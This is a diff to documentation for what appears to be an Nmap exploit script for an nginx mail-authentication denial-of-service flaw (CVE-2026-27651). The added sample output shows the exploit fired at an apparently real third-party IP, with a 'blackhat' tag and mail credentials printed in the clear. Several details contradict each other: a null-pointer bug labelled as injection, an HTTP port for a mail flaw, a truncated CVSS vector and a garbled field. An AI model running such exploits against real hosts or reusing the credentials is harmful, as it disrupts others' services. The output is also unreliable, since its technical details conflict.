@@ -420,9 +420,17 @@ Note: this script random sellects an user-agent to send in the http.post() reque
 Note: --script-args exploit="true" argument trys to exploit the denial-of-service condition in mail service
 
 Output
-CVE-2026-27651-nginx:
-| Title: NGINX Mail Authentication Vulnerability
-|  Status: VULNERABLE
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 15:49 +0100
+NSE: trying to exploit the denial-of-service in: 149.255.39.67
+NSE: blackhat::EmailUserName: postmaster@hvvc.us
+Nmap scan report for 149-255-39-67.static.hvvc.us (149.255.39.67)
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| CVE-2026-27651-nginx:
+|  Title: NGINX Mail Authentication Vulnerability
+|  State: VULNERABLE
 |    ID: CVE:CVE-2026-27651
 |    Risk factor: 8.7 (HIGH) (AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/V)
 |       CVE-2026-27651 is a Null Pointer Dereference vulnerability affecting the ngx_mail_auth_http_module
@@ -436,8 +444,8 @@ CVE-2026-27651-nginx:
 |    nginx version: NGINX Plus R32 [vulnerable version]
 |    nginx payload: CORRUPTED THE BACKEND SERVER [Injection]
 |    [auth_server]: 6.fdrz-
-|    mail_username: testaccount@ssaredteam.com
-|    mail_password: testpassw0rd
+|    mail_username: postmaster@hvvc.us
+|    mail_password: testingCVE27651
 |  * module Author: r00t-3xp10it
 |
 |  Referencies:
